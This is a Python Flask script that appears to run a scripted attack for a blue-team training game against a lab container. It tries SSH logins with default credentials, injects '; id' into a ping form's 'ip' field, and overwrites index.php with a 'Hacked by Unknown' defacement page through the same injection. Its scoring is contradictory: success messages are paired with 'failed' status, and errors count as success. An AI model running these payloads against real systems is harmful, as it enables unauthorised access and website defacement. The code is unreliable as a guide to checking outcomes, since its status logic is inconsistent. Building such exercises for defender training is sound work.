import time
import paramiko
import requests
from flask import Flask, jsonify
import threading

# Variables for hostname and port numbers
HOSTNAMES = ['container1']  # Add more hostnames as needed
SSH_PORT = 22
HTTP_PORT = 80

# Create Flask app
app = Flask(__name__)

# Lock for thread-safe access to attack_progress
progress_lock = threading.Lock()

# Dictionary to store attack progress
attack_progress = {
    '1_ssh_logins': {},
    '2_command_injection': {},
    '3_page_modification': {},
    '4_ssh_logins': {},
    '5_check_restoration': {}
}

# Initialize attack progress for all steps
for step in ['1_ssh_logins', '2_command_injection', '3_page_modification', '4_ssh_logins', '5_check_restoration']:
    for hostname in HOSTNAMES:
        attack_progress[step][hostname] = 'pending'

# Function to update attack progress (thread-safe)
def update_attack_progress(step, hostname, status):
    with progress_lock:
        attack_progress[step][hostname] = status
        print(f"Updated attack progress: {step} for {hostname} -> {status}")

# Function to attempt SSH login
def ssh_login(step, hostname, port, username, password, player_id):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(hostname, port=port, username=username, password=password)
        print(f"SSH login successful for {username} on {hostname} in {step}")
        client.close()
        update_attack_progress(step, hostname, 'success')
    except Exception as e:
        print(f"SSH login failed for {username} on {hostname} in {step}: {e}")
        update_attack_progress(step, hostname, 'failed')

# Attempt SSH logins for a given step
def ssh_logins(step):
    print(f"Attempting SSH logins for {step}...")
    for index, hostname in enumerate(HOSTNAMES):
        ssh_login(step, hostname, SSH_PORT, 'root', 'root', index + 1)
        ssh_login(step, hostname, SSH_PORT, 'user3', 'user3', index + 1)
        ssh_login(step, hostname, SSH_PORT, 'user8', 'user8', index + 1)
        ssh_login(step, hostname, SSH_PORT, 'user10', 'user10', index + 1)

# Attempts command injection for a given step
def command_injection_requests(step):
    print(f"Attempting command injection requests with 'id' command for {step}...")
    for index, hostname in enumerate(HOSTNAMES):
        url = f"http://{hostname}:{HTTP_PORT}/"
        command = 'id'
        
        data = {'ip': f'; {command}'}
        try:
            response = requests.post(url, data=data)
            print(f"POST {command} to {hostname} in {step}, Response Code: {response.status_code}, Output: {response.text}")
            
            # Check if the response status is 200 and "www-data" is not in the response
            if response.status_code == 200 and "www-data" not in response.text:
                print(f"Command injection failed on {hostname} in {step}, 'www-data' not found")
                update_attack_progress(step, hostname, 'failed')
            else:
                print(f"Command injection succeeded on {hostname} in {step}")
                update_attack_progress(step, hostname, 'success')
        except Exception as e:
            print(f"Error with POST {command} to {hostname} in {step}: {e}")
            update_attack_progress(step, hostname, 'success')

# Attempts to modify ping-checker page for a given step
def modify_ping_checker(step):
    print(f"Attempting to modify ping-checker page for {step}...")
    for index, hostname in enumerate(HOSTNAMES):
        url = f"http://{hostname}:{HTTP_PORT}/"
        payload = ('<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" '
                   'content="width=device-width, initial-scale=1.0"><title>Hacked by Unknown</title><style>'
                   'body {background-color: black;color: red;text-align: center;font-family: Arial, sans-serif;'
                   'margin: 0;padding: 0;}h1 {margin-top: 20%;font-size: 60px;}p {font-size: 24px;}</style>'
                   '</head><body><h1>Hacked by Unknown</h1><p>Your website is compromised.</p>'
                   '<p>Take action immediately!</p></body></html>')

        data = {'ip': f'; echo "{payload}" > /var/www/html/index.php'}
        
        try:
            response = requests.post(url, data=data)
            print(f"POST modify request to {hostname} in {step}, Response Code: {response.status_code}")
            # Check if the page was modified
            time.sleep(5)
            modified_page = requests.get(url)
            if response.status_code == 200 and "Hacked by Unknown" not in modified_page.text:
                print(f"Page modified successfully on {hostname} in {step}, 'Hacked by Unknown' found")
                update_attack_progress(step, hostname, 'failed')
            else:
                print(f"Failed to modify page on {hostname} in {step}")
                update_attack_progress(step, hostname, 'success')
        except Exception as e:
            print(f"Error with POST modify request to {hostname} in {step}: {e}")
            update_attack_progress(step, hostname, 'success')

# Check if the page has been restored
def check_restoration(step):
    print(f"Checking restoration of web page for {step}...")
    for index, hostname in enumerate(HOSTNAMES):
        url = f"http://{hostname}:{HTTP_PORT}/"
        
        try:
            response = requests.get(url)
            print(f"GET request to {hostname} in {step}, Response Code: {response.status_code}")
            
            # Check if the response status is 200 and "Hacked by Unknown" is not in the response
            if response.status_code == 200 and "Hacked by Unknown" not in response.text:
                print(f"Page restoration succeeded on {hostname} in {step}")
                update_attack_progress(step, hostname, 'failed')
            else:
                print(f"Page restoration failed on {hostname} in {step}")
                update_attack_progress(step, hostname, 'success')
        except Exception as e:
            print(f"Error with GET request to {hostname} in {step}: {e}")
            update_attack_progress(step, hostname, 'success')

# The attack sequence for all steps
def attack_sequence():
    print("Starting attack sequence...")
    time.sleep(5)

    # 1_ssh_logins
    ssh_logins('1_ssh_logins')
    time.sleep(5)

    # 2_command_injection
    command_injection_requests('2_command_injection')
    time.sleep(5)

    # 3_page_modification
    modify_ping_checker('3_page_modification')
    time.sleep(5)

    # 4_ssh_logins (same as 1_ssh_logins)
    ssh_logins('4_ssh_logins')
    time.sleep(5)

    # 5_check_restoration
    check_restoration('5_check_restoration')
    time.sleep(5)

# Flask route to start the game
@app.route('/game-start', methods=['POST'])
def game_start():
    # Start the attack sequence in a new thread
    attack_thread = threading.Thread(target=attack_sequence)
    attack_thread.start()
    return jsonify({"status": "Game started"}), 200

# Flask route to check attack progress
@app.route('/attack-progress', methods=['GET'])
def check_attack_progress():
    with progress_lock:
        return jsonify(attack_progress), 200

# Heath check endpoint
@app.route('/health', methods=['GET'])
def health_check():
    return jsonify({"status": "Healthy"}), 200

# Main function to run the Flask server
def main():
    app.run(host='0.0.0.0', port=5555)

# Execute
if __name__ == "__main__":
    main()
